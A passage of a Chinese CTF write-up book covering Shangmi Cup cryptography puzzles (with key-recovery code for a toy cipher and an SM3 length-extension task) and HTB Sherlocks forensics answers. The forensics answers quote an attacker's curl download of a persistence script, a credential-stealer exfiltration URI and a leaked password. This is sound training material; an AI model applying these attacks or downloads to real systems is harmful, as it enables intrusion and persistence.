+N_HEX = "FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123"
+MODULUS = Integer(int(N_HEX, 16))
+MSG_PREFIX = "CryptoCup message:"
+
+
+# 加密函数
+def encrypt_message(message, key):
+    # 添加前缀
+    message_with_prefix = MSG_PREFIX + message
+    message_bytes = message_with_prefix.encode('utf-8')
+    message_len = len(message_bytes)
+    num_blocks = (message_len + 15) // 16
+    blocks = [message_bytes[i * 16:(i + 1) * 16] for i in range(num_blocks)]
+
+    # 进行0填充
+    blocks[-1] = blocks[-1].ljust(16, b'\x00')
+
+    encrypted_blocks = []
+
+    k = key
+
+    # 加密每个分组
+    for block in blocks:
+        block_int = int.from_bytes(block, byteorder='big')
+        encrypted_block_int = Mod(block_int * k, MODULUS)
+        encrypted_blocks.append(encrypted_block_int)
+        k += 1  # 密钥自增1
+
+    # 将加密后的分组连接成最终的密文
+    encrypted_message = b''.join(
+        int(block_int).to_bytes(32, byteorder='big') for block_int in encrypted_blocks
+    )
+
+    return encrypted_message
+
+
+# 解密函数
+def decrypt_message(encrypted_message, key):
+    num_blocks = len(encrypted_message) // 32
+    blocks = [encrypted_message[i * 32:(i + 1) * 32] for i in range(num_blocks)]
+
+    decrypted_blocks = []
+
+    k = key
+
+    # 解密每个分组
+    for block in blocks:
+        block_int = int.from_bytes(block, byteorder='big')
+        key_inv = mod_inverse(k, MODULUS)
+        decrypted_block_int = Mod(block_int * key_inv, MODULUS)
+        decrypted_blocks.append(decrypted_block_int)
+        k += 1  # 密钥自增1
+
+    # 将解密后的分组连接成最终的明文
+    decrypted_message = b''.join(
+        int(block_int).to_bytes(16, byteorder='big') for block_int in decrypted_blocks
+    )
+
+    # 去除前缀
+    if decrypted_message.startswith(MSG_PREFIX.encode('utf-8')):
+        decrypted_message = decrypted_message[len(MSG_PREFIX):]
+
+    return decrypted_message.rstrip(b'\x00').decode('utf-8')
+
+
+# 测试
+initial_key = Integer(0x123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0)
+message = "Hello, this is a test message."
+print("Original Message:", message)
+
+# 加密
+encrypted_message = encrypt_message(message, initial_key)
+print("Encrypted Message (hex):", encrypted_message.hex())
+
+# 解密
+decrypted_message = decrypt_message(encrypted_message, initial_key)
+print("Decrypted Message:", decrypted_message)
+</code></pre>
+<p>已知密文为<code>a7ea042608ffce5be79a19ee45533506819e85f8d9250fccef5a89731151fd7a76d83aa85c47ba1357a86d0e9763470fb608cd54d0927125f500353e156a01da759fa814e96fa41a888eea3a9cf9b062923ed70774add490c7ed7f83d6b47e711e7b3c8a960dcc2838e577459bb6f2769d0917e1fd57db0829633b77652c2180</code></p>
+<p>方法一：通过动态调试计算获取 key</p>
+<pre><code class="language-python">...
+# 动态调试获取第一块明文和密文
+m = 89652660640613347754090896429354803559
+c = 75949716558974720160457011444725356343804438342271795660520482736366924463482
+
+# 计算密钥
+key = Mod(c * mod_inverse(m, MODULUS), MODULUS)
+print("Key:", hex(int(key)))
+# Key: 0xfb85e511115f381827f03b1cef8e6d52a5c920f8e9e285cc842b3e6ddf935b78
+
+# 解密
+encrypted_message = bytes.fromhex("a7ea042608ffce5be79a19ee45533506819e85f8d9250fccef5a89731151fd7a76d83aa85c47ba1357a86d0e9763470fb608cd54d0927125f500353e156a01da759fa814e96fa41a888eea3a9cf9b062923ed70774add490c7ed7f83d6b47e711e7b3c8a960dcc2838e577459bb6f2769d0917e1fd57db0829633b77652c2180")
+decrypted_message = decrypt_message(encrypted_message,key=Integer(0xfb85e511115f381827f03b1cef8e6d52a5c920f8e9e285cc842b3e6ddf935b78))
+print("Decrypted Message:", decrypted_message)
+# Decrypted Message: dHyNBCgxEq4prNBbxjDOiOgmvviuAgfx
+</code></pre>
+<p>方法二：静态分析</p>
+<pre><code class="language-python"># 将十六进制密文转换为字节
+cipher_bytes = bytes.fromhex("a7ea042608ffce5be79a19ee45533506819e85f8d9250fccef5a89731151fd7a76d83aa85c47ba1357a86d0e9763470fb608cd54d0927125f500353e156a01da759fa814e96fa41a888eea3a9cf9b062923ed70774add490c7ed7f83d6b47e711e7b3c8a960dcc2838e577459bb6f2769d0917e1fd57db0829633b77652c2180")
+    
+# 提取第一个密文块（32字节）
+first_cipher_block = cipher_bytes[:32]
+c0 = int.from_bytes(first_cipher_block, byteorder='big')
+    
+# 构造明文第一个块（前缀的前16字节）
+message_with_prefix = MSG_PREFIX.encode('utf-8')
+first_plain_block = message_with_prefix[:16]  # 取前16字节
+m0 = int.from_bytes(first_plain_block, byteorder='big')
+    
+# 计算m0在模MODULUS下的逆元
+m0_inv = mod_inverse(m0, MODULUS)
+    
+# 计算初始密钥: k = c0 * m0_inv mod MODULUS
+k = (c0 * m0_inv) % MODULUS
+</code></pre>
+<h3 id="初始谜题2"><a class="header" href="#初始谜题2">初始谜题2</a></h3>
+<pre><code>请下载题目附件，并获取在线场景，双击运行附件中的客户端，输入IP地址和端口号连接服务端。请认真分析题目附件中的代码，根据服务端所给出的counter和token，伪造出一个可以通过验证的counter和token，并提交至服务端。
+</code></pre>
+<p>题目源代码：</p>
+<pre><code class="language-python">import binascii
+from gmssl import sm3
+
+
+# 读取HMAC key文件
+def read_hmac_key(file_path):
+    with open(file_path, 'rb') as f:
+        hmac_key = f.read().strip()
+    return hmac_key
+
+
+# 生成token
+def generate_token(hmac_key, counter):
+    # 如果HMAC_KEY长度不足32字节，则在末尾补0，超过64字节则截断
+    if len(hmac_key) &lt; 32:
+        hmac_key = hmac_key.ljust(32, b'\x00')
+    elif len(hmac_key) &gt; 32:
+        hmac_key = hmac_key[:32]
+
+    # 将计数器转换为字节表示
+    counter_bytes = counter.to_bytes((counter.bit_length() + 7) // 8, 'big')
+    # print("counter_bytes:", binascii.hexlify(counter_bytes))
+
+    tobe_hashed = bytearray(hmac_key + counter_bytes)
+
+    # print("tobe_hashed:", binascii.hexlify(tobe_hashed))
+
+    # 使用SM3算法计算哈希值
+    sm3_hash = sm3.sm3_hash(tobe_hashed)
+
+    # 将SM3的哈希值转换为十六进制字符串作为token
+    token = sm3_hash
+
+    return token
+
+
+current_counter = 0
+
+
+def verify_token(hmac_key, counter, token):
+    # 生成token
+    generated_token = generate_token(hmac_key, counter)
+    global current_counter
+    # 比较生成的token和输入的token是否相同
+    if generated_token == token:
+        if counter &amp; 0xFFFFFFFF &gt; current_counter:
+            current_counter = counter &amp; 0xFFFFFFFF
+            print("current_counter: ", hex(current_counter))
+            return "Success"
+        else:
+            return "Error: counter must be increasing"
+    else:
+        return "Error: token not match"
+
+
+# 假设HMAC key文件路径
+hmac_key_file = 'hmac_key.txt'
+# 假设计数器值
+counter = 0x12345678
+
+# 读取HMAC key
+hmac_key = read_hmac_key(hmac_key_file)
+
+# 生成token
+token = generate_token(hmac_key, counter)
+print("Generated token:", token)
+print(verify_token(hmac_key, counter, token))
+</code></pre>
+<p>知识点：<code>SM3长度扩展攻击</code></p>
+<h3 id="初始谜题3"><a class="header" href="#初始谜题3">初始谜题3</a></h3>
+<pre><code>请下载题目附件，并获取在线场景，双击运行附件中的客户端，输入IP地址和端口号连接服务端。请认真分析题目附件中的代码，根据服务端所给出的公钥和密文，解密出所对应的明文消息，并提交至服务端。
+</code></pre>
+<p>题目源代码：</p>
+<pre><code class="language-python"></code></pre>
+<p>知识点：<code>LWE</code></p>
+<h2 id="夺旗闯关"><a class="header" href="#夺旗闯关">夺旗闯关</a></h2>
+<pre><code>
+</code></pre>
+<h2 id="参考资料-6"><a class="header" href="#参考资料-6">参考资料</a></h2>
+<ul>
+<li><a href="https://github.com/CTF-Archives/2024-shangmicup">CTF-Archives/2024-shangmicup</a></li>
+<li><a href="https://mp.weixin.qq.com/s/0WkM0SLgXAv4-FbB9tkKJQ">WriteUp | 第二届“熵密杯”密码安全挑战赛解题思路分享</a></li>
+<li><a href="https://tangcuxiaojikuai.xyz/post/6452f9a0.html">糖醋小鸡块的blog - 2024-熵密杯-wp-crypto</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2023年首届熵密杯密码应用安全竞赛-1"><a class="header" href="#2023年首届熵密杯密码应用安全竞赛-1">2023年首届熵密杯密码应用安全竞赛</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="picoctf"><a class="header" href="#picoctf">picoCTF</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="picoctf-2025"><a class="header" href="#picoctf-2025">picoCTF 2025</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="picoctf-2024"><a class="header" href="#picoctf-2024">picoCTF 2024</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="picoctf-2023"><a class="header" href="#picoctf-2023">picoCTF 2023</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="picoctf-2022"><a class="header" href="#picoctf-2022">picoCTF 2022</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="picoctf-2021"><a class="header" href="#picoctf-2021">picoCTF 2021</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="htb"><a class="header" href="#htb">HTB</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="htb-sherlocks-brutus"><a class="header" href="#htb-sherlocks-brutus">HTB Sherlocks Brutus</a></h1>
+<p>题目附件：<a href="HTB/Sherlocks/Brutus/./attachments/Brutus.zip">下载地址</a></p>
+<p>解压密码：<code>hacktheblue</code></p>
+<p><a href="HTB/Sherlocks/Brutus/./attachments/Sherlocks%20Brutus%20Official%20Writeup.pdf">官方 Writeup</a></p>
+<h2 id="任务1"><a class="header" href="#任务1">任务1</a></h2>
+<blockquote>
+<p>分析 auth.log。攻击者用于进行暴力破解的 IP 地址是什么？（x.x.x.x）</p>
+</blockquote>
+<p>检索关键词 <code>Failed password</code></p>
+<p>FLAG：<code>65.2.161.68</code></p>
+<h2 id="任务2"><a class="header" href="#任务2">任务2</a></h2>
+<blockquote>
+<p>暴力破解尝试已成功，攻击者获得了服务器上某个账户的访问权限。该账户的用户名是什么？（***t）</p>
+</blockquote>
+<p>检索关键词 <code>Accepted password</code></p>
+<p>FLAG：<code>root</code></p>
+<h2 id="任务3"><a class="header" href="#任务3">任务3</a></h2>
+<blockquote>
+<p>确定攻击者手动登录服务器并建立终端会话以执行其目标的 UTC 时间戳。登录时间与认证时间不同，可在 wtmp 工件中找到。（YYYY-MM-DD HH:MM:SS）</p>
+</blockquote>
+<ul>
+<li>使用 last 命令</li>
+</ul>
+<pre><code class="language-bash">$ last -f wtmp -F
+cyberjun pts/1        65.2.161.68      Wed Mar  6 14:37:35 2024   gone - no logout
+root     pts/1        65.2.161.68      Wed Mar  6 14:32:45 2024 - Wed Mar  6 14:37:24 2024  (00:04)
+root     pts/0        203.101.190.9    Wed Mar  6 14:19:55 2024   gone - no logout
+reboot   system boot  6.2.0-1018-aws   Wed Mar  6 14:17:15 2024   still running
+root     pts/1        203.101.190.9    Sun Feb 11 18:54:27 2024 - Sun Feb 11 19:08:04 2024  (00:13)
+root     pts/1        203.101.190.9    Sun Feb 11 18:41:11 2024 - Sun Feb 11 18:41:46 2024  (00:00)
+root     pts/0        203.101.190.9    Sun Feb 11 18:33:49 2024 - Sun Feb 11 19:08:04 2024  (00:34)
+root     pts/0        203.101.190.9    Thu Jan 25 19:15:40 2024 - Thu Jan 25 20:34:34 2024  (01:18)
+ubuntu   pts/0        203.101.190.9    Thu Jan 25 19:13:58 2024 - Thu Jan 25 19:15:12 2024  (00:01)
+reboot   system boot  6.2.0-1017-aws   Thu Jan 25 19:12:17 2024 - Sun Feb 11 19:09:18 2024 (16+23:57)
+
+wtmp begins Thu Jan 25 19:12:17 2024
+</code></pre>
+<ul>
+<li>使用提供的脚本</li>
+</ul>
+<pre><code class="language-bash">python3 utmp.py wtmp -o wtmp.out
+</code></pre>
+<p>FLAG：<code>2024-03-06 06:32:45</code></p>
+<h2 id="任务4"><a class="header" href="#任务4">任务4</a></h2>
+<blockquote>
+<p>SSH 登录会话在登录时会被跟踪并分配一个会话编号。对于问题 2 中该用户账户的攻击者会话，被分配的会话编号是多少？（XX）</p>
+</blockquote>
+<pre><code>Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+</code></pre>
+<p>FLAG：<code>37</code></p>
+<h2 id="任务5"><a class="header" href="#任务5">任务5</a></h2>
+<blockquote>
+<p>攻击者在服务器上作为其持久化策略的一部分添加了一个新用户，并为该新用户账户赋予了更高的权限。该账户的名称是什么？</p>
+</blockquote>
+<p>FLAG：<code>cyberjunkie</code></p>
+<h2 id="任务6"><a class="header" href="#任务6">任务6</a></h2>
+<blockquote>
+<p>通过创建新账户进行持久化所对应的 MITRE ATT&amp;CK 子技术编号是什么？（TXXXX.XXX）</p>
+</blockquote>
+<p>FLAG：<code>T1136.001</code></p>
+<h2 id="任务7"><a class="header" href="#任务7">任务7</a></h2>
+<blockquote>
+<p>根据 auth.log，攻击者的首次 SSH 会话在何时结束？（YYYY-MM-DD HH:MM:SS）</p>
+</blockquote>
+<p>FLAG：<code>2024-03-06 06:37:24</code></p>
+<h2 id="任务8"><a class="header" href="#任务8">任务8</a></h2>
+<blockquote>
+<p>攻击者登录其后门账户并利用更高权限下载了一个脚本。使用 sudo 执行的完整命令是什么？</p>
+</blockquote>
+<p>FLAG：<code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="htb-sherlocks-bumblebee"><a class="header" href="#htb-sherlocks-bumblebee">HTB Sherlocks Bumblebee</a></h1>
+<p>题目附件：<a href="HTB/Sherlocks/Bumblebee/">下载地址</a></p>
+<p>解压密码：<code>hacktheblue</code></p>
+<p><a href="HTB/Sherlocks/Bumblebee/./attachments/Sherlocks%20Bumblebee%20Official%20Writeup.pdf">官方 Writeup</a></p>
+<p><a href="https://sqlitebrowser.org/">https://sqlitebrowser.org/</a></p>
+<h2 id="任务1-1"><a class="header" href="#任务1-1">任务1</a></h2>
+<blockquote>
+<p>外部承包商的用户名是什么？</p>
+</blockquote>
+<p>FLAG：<code>apoole1</code></p>
+<h2 id="任务2-1"><a class="header" href="#任务2-1">任务2</a></h2>
+<blockquote>
+<p>承包商使用了哪个 IP 地址创建他们的账户？</p>
+</blockquote>
+<p>FLAG：<code>10.10.0.78</code></p>
+<h2 id="任务3-1"><a class="header" href="#任务3-1">任务3</a></h2>
+<blockquote>
+<p>承包商发布的恶意帖子其 post_id 是多少？</p>
+</blockquote>
+<p>FLAG：<code>9</code></p>
+<h2 id="任务4-1"><a class="header" href="#任务4-1">任务4</a></h2>
+<blockquote>
+<p>凭据窃取程序将其数据发送到的完整 URI 是什么？</p>
+</blockquote>
+<p>FLAG：<code>http://10.10.0.78/update.php</code></p>
+<h2 id="任务5-1"><a class="header" href="#任务5-1">任务5</a></h2>
+<blockquote>
+<p>承包商何时以管理员身份登录论坛？（UTC）</p>
+</blockquote>
+<p>FLAG：<code>26/04/2023 10:53:12</code></p>
+<h2 id="任务6-1"><a class="header" href="#任务6-1">任务6</a></h2>
+<blockquote>
+<p>论坛中存在用于 LDAP 连接的明文凭据，密码是什么？</p>
+</blockquote>
+<p>表 <code>phpbb_config</code></p>
+<p>FLAG：<code>Passw0rd1</code></p>
+<h2 id="任务7-1"><a class="header" href="#任务7-1">任务7</a></h2>
+<blockquote>
+<p>管理员用户的 User-Agent 是什么？</p>
+</blockquote>
+<p>过滤管理员的 IP <code>10.255.254.2</code></p>
+<pre><code>10.255.254.2 - - [25/Apr/2023:12:08:42 +0100] "GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=12 HTTP/1.1" 403 9412 "http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
+</code></pre>
+<p>FLAG：<code>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</code></p>
+<h2 id="任务8-1"><a class="header" href="#任务8-1">任务8</a></h2>
+<blockquote>
+<p>承包商在何时将自己添加到管理员组？（UTC）</p>
+</blockquote>
+<p>FLAG：<code>26/04/2023 10:53:51</code></p>
+<h2 id="任务9"><a class="header" href="#任务9">任务9</a></h2>
+<blockquote>
+<p>承包商在何时下载了数据库备份？（UTC）</p>
+</blockquote>
+<pre><code>10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
+</code></pre>
+<p>FLAG：<code>26/04/2023 11:01:38</code></p>
+<h2 id="任务10"><a class="header" href="#任务10">任务10</a></h2>
+<blockquote>
+<p>根据 access.log 所述，数据库备份的大小（字节）是多少？</p>
+</blockquote>
+<p>FLAG：<code>34707</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="operation-blackout-2025-phantom-check"><a class="header" href="#operation-blackout-2025-phantom-check">Operation Blackout 2025: Phantom Check</a></h1>
+<p>Talion 怀疑威胁行为体进行了反虚拟化检测以规避在沙箱环境中的检测。您的任务是分析事件日志，并识别出用于虚拟化检测的具体技术。Byte Doctor 需要获取攻击者为执行这些检查而操作的注册表项或进程的证据。</p>
+<h2 id="任务1-2"><a class="header" href="#任务1-2">任务1</a></h2>
+<blockquote>
+<p>攻击者使用了哪个WMI类来获取虚拟化检测所需的型号和制造商信息？（<em><strong><strong>_</strong></strong></em>*********）</p>
+</blockquote>
+<p>FLAG：<code>Win32_ComputerSystem</code></p>
+<h2 id="任务2-2"><a class="header" href="#任务2-2">任务2</a></h2>
+<blockquote>
+<p>攻击者执行了哪个WMI查询来获取机器的当前温度值？（****** * **** <strong><strong><strong>_</strong></strong></strong>****************）</p>
+</blockquote>
+<p>FLAG：``</p>
+<h2 id="任务3-2"><a class="header" href="#任务3-2">任务3</a></h2>
+<blockquote>
+<p>攻击者加载了用于检测虚拟化的PowerShell脚本。该脚本的函数名称是什么？（****-**）</p>
+</blockquote>
+<p>FLAG：<code>Check-VM</code></p>
+<h2 id="任务4-2"><a class="header" href="#任务4-2">任务4</a></h2>
+<blockquote>
+<p>上述脚本查询了哪个注册表键来获取虚拟化检测所需的服务详情？（<strong><strong>:*<em><strong><strong>*</strong></strong></em></strong></strong><em><strong>*</strong></em>****）</p>
+</blockquote>
+<p>FLAG：<code>HKLM:\SYSTEM\ControlSet001\Services</code></p>
+<h2 id="任务5-2"><a class="header" href="#任务5-2">任务5</a></h2>
+<blockquote>
+<p>该虚拟机检测脚本也能识别VirtualBox。它通过比较哪些进程来判断系统是否正在运行VirtualBox？（********<em><strong>.</strong></em>, *****<em><strong>.</strong></em>）</p>
+</blockquote>
+<p>FLAG：<code>vboxservice.exe, vboxtray.exe</code></p>
+<h2 id="任务6-2"><a class="header" href="#任务6-2">任务6</a></h2>
+<blockquote>
+<p>该虚拟机检测脚本会以“This is a”为前缀打印检测结果。脚本检测到了哪两种虚拟化平台？（*****-*, ******）</p>
+</blockquote>
+<p>FLAG：<code>Hyper-V, Vmware</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="御网杯"><a class="header" href="#御网杯">御网杯</a></h1>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="theme/pagetoc.js"></script>
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+
+    </div>
+    </body>
+</html>
